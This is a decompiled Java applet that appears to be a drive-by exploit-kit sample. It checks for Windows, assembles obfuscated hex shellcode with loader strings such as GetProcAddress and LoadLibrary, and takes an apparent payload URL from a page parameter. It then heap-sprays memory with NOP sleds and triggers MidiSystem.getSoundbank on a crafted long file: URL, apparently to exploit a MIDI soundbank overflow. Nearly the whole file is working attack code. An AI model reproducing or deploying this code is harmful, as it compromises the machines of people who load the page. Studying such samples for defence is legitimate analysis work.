import javax.sound.midi.MidiSystem;
import java.net.URL;
import java.nio.IntBuffer;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Ifology extends Applet
{
    private IntBuffer[] mem;
    
    @Override
    public void init() {
        repeat('/', 303);
        if (System.getProperty("os.rrnarrrrme".replace("r", "")).toLowerCase().indexOf("mmwimmmmn".replace("m", "")) < 0) {
            return;
        }
        final String string = "````fil````e:/``/".replace("`", "") + repeat('/', 302) + "ZFFF%FFFZ%Z%Z%ZFF%Z%FFF".replace("F", "");
        final String string2 = "5N05NN35N1NNN5N2565NNNN7NNNN5NNNNN5NN9CE8NN000NNN000NNNN0NNNN0NNNNNNN5NNNDNNN83ED0NNNDNNNN31CN0NN640NNNN3NNNN4030NNNN78NNN0CN8B40NN0C8B701NNNNCADNNN8BNNN4NNN0NN0NNNN8EBNNNN0NNN9NNN8NNNNBNN4NNNN03NNNN4N8NNNNNDNNNNN407C8NNNB4NNNN0N3C5NNN6".replace("N", "") + "57BE5E010ZZZ0ZZ0001EEBF4E01ZZ000001ZEZZZZFE8DZ6ZZZZ0Z100ZZZZ0ZZZZZ05ZFZZZ5EZZZZZ8ZZ9EZZA81ZZZZC2ZZZ5E0ZZZ10Z0ZZZZZ0ZZZ0ZZZZZ5ZZ2ZZZ68ZZZZ8ZZZ00ZZ00000ZZFFZZZ9Z54ZZZZZZZE01ZZZ0Z00ZZZ0ZZZ89EZZZZZZAZZZZZ81CZ25ZZE0Z".replace("Z", "") + "1bbb00bbb003bbb1Fb601C28bAbbb9Cb3bbbbb56302bbbb00b0bbbbbbb0bbb8bbb0bbbbbFbbbB0bbbb0bbbb74bbb0bbbbb6881Cb3bb24bbb6bEbBEbbbbEC6b043bbbb2b0b0bbb8bbb9bbbEbbbbbA81C2b4502bbb0000bbb52bbFbbF9bb5b5b2bb01bb0bbbb0bb0bbbb0bbb89EbA81Cb2bb".replace("b", "") + "5TTTTTT0TTT02TTTT000T0TT525TT0FF95TTTT56TT0100TTTTTTTT006A0T0TTTT6A00TTT8TTT9ETTTTATTTT8TT1C2TTTT5TTTTETTTT0100TT005TT28TTT9TTTTEA8TTTT1CTTTTTTT27T802TTT0000TT526AT00FFTTD0T6TTTATT0TT5TTTT89TTTETA8TTTT1TC2TTTTT5E0TT1TTT00TTTT0".replace("T", "") + "052FHHF9HH55HHHA0HH100HH0HHH08HH9EHHAHH8H1C25E0100HHHHH0HHH05H2H6H880HHHH00000HH0FHHHHHFHH95HHHH4HHHEHHHH010HH00HHH0H8HHHH9EHHA81HCH2HH5E0HHH1HH00003HH1HHHF60H1C2HHHH8A9C3HHH56HHEHHHH0200HHHHH00HH80".replace("H", "") + "yFyyyB00y7yyyyyyyy4yy0yyy6881C3yyyy246EBEyEC6yy0yy4320yy0y89EAyy81yyyC24yyy5yyy02yy000yy052FF955yyy20yyy10yyy0yyyy0089yEA81yyC2500200yyyy00525yyy0FF9y5yy5601yyy00006Ayy006".replace("y", "") + "A0O089EOA81COOO25E01OOO0000OO5O289EOOOOAOOOO8O1C2AOO60OOOO2OO00OOOO00O526OOOOA0OOO0OOOOOFOOFOOOD0OOO6OOOOA058OOO9EOOOAOOOO8O1C2O5EOOOO0OO1O00005OOOO2OOOOFFOO955OOOA010O00OOOO09ODOOO5OOOOD5F5OOOEOOOO5A595OOOOB".replace("O", "") + "58C3ZZ000ZZ0ZZZZZ000ZZZ00ZZZZ0000ZZZ000ZZZZ0ZZ00ZZZZ00ZZZZ00Z0000000ZZ00Z4ZZ7ZZZ65ZZZ74ZZ5ZZZ4ZZ65ZZZZ6D7ZZ0ZZZ506174684ZZZZ1004ZZZZCZZZ6ZZFZZZZ61644C6ZZZ9ZZZZ627ZZ261Z7ZZZZ2794ZZ1ZZZ004765745".replace("Z", "") + "Z0726ZF6ZZZZZZ3ZZZZ41646ZZZZ4Z7ZZZ2ZZ6ZZZ5Z7Z3ZZ7Z3Z0ZZZZZZ0ZZZZ57ZZZ6ZZZZ96ZZE4578Z6ZZZZ5ZZZ630ZZ0BBZZ89FZZZZ289FZ730ZZZZC0AEZZZZZ75ZZFZZZD29FZZZZZZ7ZZZZ89FZZ9ZZZZZZ3ZZ1CZZZ0ZZZZZZBEZZ3ZCZ0ZZZ000ZZZ0ZZZZ003B51B0200ZZZ0066".replace("Z", "") + "AVVVVD03VVVV8V5V1VVVVBVVV020VVVV000VV8VB7VV07V883C61CVVV0V3VVVVB5V1BVVVV02VVVV0V0VVVV0V0VVV8DVBDVV1FVVVV020VVVVVVVV0VVV00AD0VVVV3VV851VBVV0VV20000VVVAVVVBVVVVADVVVVVVVV038VV5VVVVVVV1B0200VV0VV0VVVV5VV0AVVVBAVVVD038VVVVVV51VVB0VV2VVVV0".replace("V", "") + "0;;;00;;;;A;B5E3;;;1;;DBAD5603;;;8;51B;;;0200;;;00;;;8;;;9;;C6;;8;;;9D;;;751FCF;3A;;;;659;;740;;;4;;;5;;;E4;;;;;;3E;;;BE9;5E93;;D1E;;;0;;;;0;385;;2;;702;;;0000;;;31;;;F;;;;6;;96;;;66;;;;A;;;;DC;;;1E00;;2;;0;3".replace(";", "") + "851FXXX02XXXXX0XX0XX0089XXC6XAXXD0XX38XXX51XXXXB020X0XXX0X0XXXC3XEBXX1XX00XXXX00XX0XXX0XXXXX00000000XXXXX00XX0XXXX00XX000XXXX0000000X0000XX8XXX985XX1B0XXXX20X0XXXX00XXXXX5XXX6XXXX57EX85X8XFXXFFXXXFXFXXFXXX5XXXFXXX5".replace("X", "") + "EeeeAeeeeB0eeee1CeeEeeee80eee3eEBeB7ee4eee02EeeeeBEeeeeeeDCeee3555eee2ee4C4eeeDeeee4eeFeeeeeee4eeeeE2Eeeee4ee44eC4Ce005e5eeee52eee4eeC4e46F776E6C6eeF6ee16eee4e5ee4eeeee6F46eeeee696eeeeeC6541e0eeee0eeee7064667eee5eee7e0eee642E6eee5eee7eeee86eee5ee0eee06eeee3e72617eeeeee36eee8e2eEeeee706eeee8eeee7e0ee0e0e".replace("e", "");
        try {
            final String string3 = "" + string2 + Brealizer.decodeString(this.getParameter("sfifffte".replace("f", ""))) + "00=====90".replace("=", "");
            final URL url = new URL(string);
            this.mem = this.__Y(string3, "9v09vv090vvvv9v0".replace("v", ""));
            MidiSystem.getSoundbank(url);
            while (true) {
                Thread.sleep(10L);
            }
        }
        catch (Exception ex) {}
    }
    
    public static String repeat(final char c, final int n) {
        String string = "";
        for (int i = 0; i < n; ++i) {
            string += c;
        }
        return string;
    }
    
    public static short[] HexDecode(final String s) {
        final short[] array = new short[s.length() / 2];
        for (int i = 0; i < s.length(); i += 2) {
            array[i / 2] = (short)(((Character.digit(s.charAt(i), 16) & 0xFF) << 4) + (Character.digit(s.charAt(i + 1), 16) & 0xFF));
        }
        return array;
    }
    
    public final IntBuffer[] __Y(final String s, final String s2) {
        return this.__Y(HexDecode(s), HexDecode(s2));
    }
    
    public final IntBuffer[] __Y(final short[] array, final short[] array2) {
        final int n = 50;
        final int n2 = 1048576;
        final int n3 = n2 / 4 - array.length;
        final IntBuffer[] array3 = new IntBuffer[n];
        for (int i = 0; i < n; ++i) {
            final IntBuffer allocate = IntBuffer.allocate(n2 / 4);
            for (int j = 0; j < n3; ++j) {
                allocate.put(array2[0] | array2[1] << 8 | array2[2] << 16 | array2[3] << 24);
            }
            int k = 0;
            while (k < array.length) {
                allocate.put(array[k++] | array[k++] << 8 | array[k++] << 16 | array[k++] << 24);
            }
            array3[i] = allocate;
        }
        return array3;
    }
}
